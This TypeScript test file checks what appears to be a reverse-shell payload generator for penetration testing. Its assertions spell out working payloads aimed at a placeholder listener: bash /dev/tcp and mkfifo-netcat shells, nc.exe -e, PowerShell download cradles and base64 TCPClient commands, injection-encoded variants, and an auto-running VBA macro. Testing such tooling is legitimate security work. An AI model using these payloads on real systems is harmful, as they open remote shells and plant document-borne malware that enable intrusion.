import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { decodeUtf16leBase64 } from "../../../engines/payloads/encode";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";

const V = { LHOST: "192.0.2.10", LPORT: "443" };
const def = (id: string) => {
  const d = REVERSE_SHELLS.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};

describe("REVERSE_SHELLS", () => {
  it("every def has parts covering each flag in its template", () => {
    for (const d of REVERSE_SHELLS) {
      expect(d.parts.length).toBeGreaterThan(0);
      for (const p of d.parts) expect(p.token && p.explain).toBeTruthy();
      for (const ctx of d.contexts) {
        const { text } = buildPayload(d, ctx, V);
        const flags = text.match(/(?<=^|[\s+])--?[A-Za-z][\w]*/g) ?? [];
        for (const f of flags) {
          expect(d.parts.some((p) => p.token.includes(f)), `${d.id}/${ctx}: ${f}`).toBe(true);
        }
      }
    }
  });

  it("bash-tcp in injected-linux is bash -c wrapped", () => {
    expect(buildPayload(def("bash-tcp"), "injected-linux", V).text).toBe("bash -c 'bash -i >& /dev/tcp/192.0.2.10/443 0>&1'");
  });

  it("no Linux def uses nc -e", () => {
    for (const d of REVERSE_SHELLS.filter((x) => x.os === "linux")) expect(d.template).not.toMatch(/\bnc\b.* -e\b/);
  });

  it("ps-b64 decodes to a TCPClient script with the given LHOST and LPORT", () => {
    const { text } = buildPayload(def("ps-b64"), "cmd", V);
    const m = text.match(/^powershell -nop -w hidden -e (\S+)$/);
    expect(m).not.toBeNull();
    const script = decodeUtf16leBase64(m![1]);
    expect(script).toContain("TCPClient");
    expect(script).toContain('("192.0.2.10",443)');
  });

  it("ps-b64 in url-param is URL-encoded so base64 survives", () => {
    const { text } = buildPayload(def("ps-b64"), "url-param", V);
    expect(text).toMatch(/^powershell\+-nop\+-w\+hidden\+-e\+/);
    expect(text).not.toMatch(/[=/]/);
    const b64 = decodeURIComponent(text.replace(/\+-e\+/, "+-e+").split("-e+")[1].replace(/\+/g, "%2B"));
    expect(decodeUtf16leBase64(b64)).toContain('TCPClient("192.0.2.10",443)');
  });

  it("nishang-cradle in sql-string has doubled quotes", () => {
    const b = buildPayload(def("nishang-cradle"), "sql-string", V);
    expect(b.text).toContain("DownloadString(''http://192.0.2.10/rev.ps1'')");
    expect(def("nishang-cradle").bakesIp).toBe(true);
    expect(def("powercat-cradle").bakesIp).toBeFalsy();
  });

  it("nc-exe carries the no -e note", () => {
    expect(buildPayload(def("nc-exe"), "cmd", V).notes.join(" ")).toContain("if it returns instantly, the build has no -e");
  });

  it("listener is penelope -O -p 443 for LPORT 443", () => {
    expect(buildPayload(def("bash-tcp"), "bash-prompt", V).listener).toBe("penelope -O -p 443");
  });

  it("unresolved lists LHOST when it is blank", () => {
    const b = buildPayload(def("bash-tcp"), "bash-prompt", { LHOST: " ", LPORT: "443" });
    expect(b.unresolved).toEqual(["LHOST"]);
    expect(b.text).toContain("{LHOST}");
    const e = buildPayload(def("ps-b64"), "cmd", { LPORT: "443" });
    expect(e.unresolved).toEqual(["LHOST"]);
    expect(e.text).toContain("{LHOST}");
  });

  it("backgrounded mkfifo ends with ) &", () => {
    expect(buildPayload(def("mkfifo-nc-bg"), "bash-prompt", V).text).toMatch(/^\(rm -f.*\) &$/);
  });

  it("bash-tcp in php-system is bash -c wrapped inside system()", () => {
    expect(buildPayload(def("bash-tcp"), "php-system", V).text).toBe(
      "system('bash -c \\'bash -i >& /dev/tcp/192.0.2.10/443 0>&1\\'');",
    );
  });

  it("ps-b64 in macro: every line fits VBA and the chunks rebuild the command", () => {
    const { text } = buildPayload(def("ps-b64"), "macro", V);
    const lines = text.split("\n");
    for (const l of lines) expect(l.length).toBeLessThanOrEqual(1023);
    const joined = lines
      .map((l) => l.match(/^ {4}Str = Str \+ "(.*)"$/)?.[1])
      .filter((x): x is string => x !== undefined)
      .join("")
      .replace(/""/g, '"');
    expect(joined).toBe(buildPayload(def("ps-b64"), "cmd", V).text);
    expect(text).toContain('CreateObject("Wscript.Shell").Run Str');
    expect(text).toContain("Sub AutoOpen()");
    expect(text).toContain("Sub Document_Open()");
  });

  const CRADLE = `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')"`;
  const FIFO = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f";
  const exact: [string, Parameters<typeof buildPayload>[1], string][] = [
    ["bash-tcp", "bash-prompt", "bash -i >& /dev/tcp/192.0.2.10/443 0>&1"],
    ["bash-tcp", "url-param", "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27"],
    ["bash-tcp", "webshell-param", "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27"],
    ["mkfifo-nc", "bash-prompt", FIFO],
    ["mkfifo-nc", "injected-linux", `bash -c '${FIFO}'`],
    ["mkfifo-nc-bg", "bash-prompt", `(${FIFO}) &`],
    ["nishang-cradle", "cmd", CRADLE],
    ["nishang-cradle", "powershell", CRADLE],
    ["nishang-cradle", "sql-string", CRADLE.replace(/'/g, "''")],
    ["powercat-cradle", "powershell", "IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10/powercat.ps1');powercat -c 192.0.2.10 -p 443 -e powershell"],
    ["nc-exe", "cmd", "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443"],
    ["nc-exe", "powershell", "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443"],
  ];
  it.each(exact)("%s in %s gives the exact text", (id, ctx, want) => {
    expect(buildPayload(def(id), ctx, V).text).toBe(want);
  });

  it("ps-b64 in cmd and powershell is the same single command line", () => {
    expect(buildPayload(def("ps-b64"), "powershell", V).text).toBe(buildPayload(def("ps-b64"), "cmd", V).text);
  });
});
